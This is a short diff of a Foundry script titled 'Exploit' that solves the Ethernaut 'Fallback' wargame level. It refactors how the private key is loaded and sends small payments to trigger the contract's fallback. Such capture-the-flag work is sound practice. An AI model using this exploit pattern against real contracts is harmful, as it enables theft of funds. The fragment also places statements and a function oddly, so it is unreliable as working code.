@@ -10,11 +10,10 @@ contract Exploit is Script {
 
         Fallback level = Fallback(payable(instance));
         address instance = vm.envAddress("INSTANCE_LEVEL1");
-        uint256 hacker = vm.envUint("PRIVATE_KEY");   
-        address deployer = vm.rememberKey(hacker);
+        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
       
         function run() external {
-            vm.startBroadcast(deployer);
+            vm.startBroadcast(hacker);
             level.contribute{value: 1 wei}();
             (bool sent, ) = address(level).call{value: 1 wei}("");
             require(sent, "Failed to call send()");
